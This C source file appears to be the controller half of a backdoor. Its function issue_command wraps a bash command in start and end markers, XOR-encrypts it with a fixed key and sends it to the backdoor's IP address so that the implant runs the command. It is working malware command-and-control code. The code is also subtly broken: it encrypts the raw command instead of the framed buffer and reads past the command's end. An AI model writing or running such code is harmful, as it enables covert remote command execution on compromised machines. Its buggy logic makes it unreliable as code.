#include "controller.h"

#include "constants.h"
#include "networking.h"
#include "crypto.h"

#include <arpa/inet.h>
#include <stdlib.h>
#include <string.h>

/**
 * Crafts a packet and sends it to address with a payload containing command.
 * This will cause the backdoor located at address to run the command given.
 *
 * Params:
 *      const char *server: The address of the backdoor.
 *
 *      const char *command: The bash command to run.
 */
void issue_command(const char *address, const char *command)
{
    int total_len;
    int command_start_len;
    int command_end_len;
    int command_len;

    char *buffer;
    char *encrypted;

    struct in_addr addr;

    command_start_len = strlen(COMMAND_START);
    command_end_len = strlen(COMMAND_END);
    command_len = strlen(command);
    total_len = command_len + command_start_len + command_end_len + 1;

    buffer = (char *)calloc(total_len, sizeof(char));
    encrypted = (char *)calloc(total_len, sizeof(char));

    inet_pton(AF_INET, address, &addr.s_addr);

    memcpy(buffer, COMMAND_START, command_start_len);
    memcpy(buffer + command_start_len, command, command_len);
    memcpy(buffer + command_start_len + command_len, COMMAND_END,
           command_end_len);

    xor_bytes(XOR_KEY, strlen(XOR_KEY), command, encrypted, total_len);

    send_message_to_ip(addr, SERVER_PORT, encrypted, total_len);

    free(encrypted);
    free(buffer);
}
